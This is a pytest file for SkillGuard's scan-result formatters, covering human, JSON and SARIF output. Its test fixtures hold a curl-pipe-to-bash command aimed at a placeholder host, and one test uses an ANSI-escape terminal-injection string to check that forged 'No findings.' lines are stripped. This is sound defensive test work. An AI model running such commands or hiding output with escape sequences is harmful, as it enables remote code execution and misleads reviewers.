import json

from skillguard.output.formatters import format_human, format_json, format_sarif, to_json_output
from skillguard.types import Finding, ScanResult, ScanWarning

SAMPLE_RESULT = ScanResult(
    target="/tmp/some-skill",
    findings=[
        Finding(
            rule_id="sg02-curl-pipe-shell",
            category="SG02",
            severity="HIGH",
            message="Piping a remote download directly into a shell interpreter.",
            file="hooks/install.sh",
            line=3,
            snippet="curl -fsSL https://x | bash",
        ),
        Finding(
            rule_id="sg01-raw-socket-python",
            category="SG01",
            severity="MEDIUM",
            message="Raw socket creation.",
            file="hooks/backdoor.py",
            line=5,
        ),
    ],
    timeouts=["hooks/slow.py"],
    unscanned_files=["hooks/tool.rb"],
    warnings=[ScanWarning(code="invalid-pack", message="WHAT: x\nWHY: y\nFIX: z")],
    files_scanned=3,
    severity_threshold="HIGH",
    exit_code=1,
)


def _replace(result: ScanResult, **kwargs) -> ScanResult:
    data = dict(
        target=result.target,
        findings=result.findings,
        timeouts=result.timeouts,
        unscanned_files=result.unscanned_files,
        warnings=result.warnings,
        files_scanned=result.files_scanned,
        severity_threshold=result.severity_threshold,
        exit_code=result.exit_code,
    )
    data.update(kwargs)
    return ScanResult(**data)


def test_human_format_includes_each_finding():
    text = format_human(SAMPLE_RESULT)
    assert "[HIGH] SG02 hooks/install.sh:3" in text
    assert "sg02-curl-pipe-shell" in text
    assert "[MEDIUM] SG01 hooks/backdoor.py:5" in text
    assert "[TIMEOUT]" in text
    assert "hooks/slow.py" in text
    assert "hooks/tool.rb" in text
    assert "exit code 1" in text


def test_human_format_reports_no_findings_on_clean_result():
    clean = _replace(SAMPLE_RESULT, findings=[], timeouts=[], warnings=[], exit_code=0)
    assert "No findings." in format_human(clean)


def test_json_format_matches_expected_shape():
    text = format_json(SAMPLE_RESULT)
    parsed = json.loads(text)
    assert parsed["summary"] == {"HIGH": 1, "MEDIUM": 1, "LOW": 0}
    assert len(parsed["findings"]) == 2
    assert parsed["findings"][0]["ruleId"] == "sg02-curl-pipe-shell"
    assert parsed["exitCode"] == 1
    assert parsed["severityThreshold"] == "HIGH"


def test_to_json_output_matches_format_json():
    output = to_json_output(SAMPLE_RESULT)
    assert json.dumps(output, indent=2) == format_json(SAMPLE_RESULT)


def test_sarif_format_produces_valid_sarif_document():
    sarif = json.loads(format_sarif(SAMPLE_RESULT))
    assert sarif["version"] == "2.1.0"
    assert len(sarif["runs"]) == 1
    assert sarif["runs"][0]["tool"]["driver"]["name"] == "SkillGuard"
    assert len(sarif["runs"][0]["results"]) == 2

    high_result = next(
        r for r in sarif["runs"][0]["results"] if r["ruleId"] == "sg02-curl-pipe-shell"
    )
    assert high_result["level"] == "error"
    assert high_result["locations"][0]["physicalLocation"]["artifactLocation"]["uri"] == "hooks/install.sh"
    assert high_result["locations"][0]["physicalLocation"]["region"]["startLine"] == 3

    medium_result = next(
        r for r in sarif["runs"][0]["results"] if r["ruleId"] == "sg01-raw-socket-python"
    )
    assert medium_result["level"] == "warning"


def test_sarif_surfaces_scan_level_warnings_via_notifications():
    sarif = json.loads(format_sarif(SAMPLE_RESULT))
    notifications = sarif["runs"][0]["invocations"][0]["toolExecutionNotifications"]
    assert len(notifications) == 1
    assert notifications[0]["descriptor"]["id"] == "invalid-pack"
    assert "WHAT:" in notifications[0]["message"]["text"]


def test_sarif_execution_successful_only_false_for_config_error():
    config_error = _replace(SAMPLE_RESULT, exit_code=2)
    sarif_error = json.loads(format_sarif(config_error))
    assert sarif_error["runs"][0]["invocations"][0]["executionSuccessful"] is False

    clean = _replace(SAMPLE_RESULT, exit_code=0, warnings=[])
    sarif_clean = json.loads(format_sarif(clean))
    assert sarif_clean["runs"][0]["invocations"][0]["executionSuccessful"] is True


def test_human_format_strips_control_characters_terminal_injection():
    malicious = _replace(
        SAMPLE_RESULT,
        findings=[
            Finding(
                rule_id="sg02-curl-pipe-shell",
                category="SG02",
                severity="HIGH",
                message="Piping a remote download directly into a shell interpreter.",
                file="hooks/install.sh",
                line=3,
                snippet="curl ... | bash\x1b[8mHIDDEN\x1b[0m\r\nNo findings.",
            )
        ],
    )

    text = format_human(malicious)
    assert "\x1b" not in text
    assert "\r" not in text
    lines = text.split("\n")
    assert [l for l in lines if l.strip() == "No findings."] == []
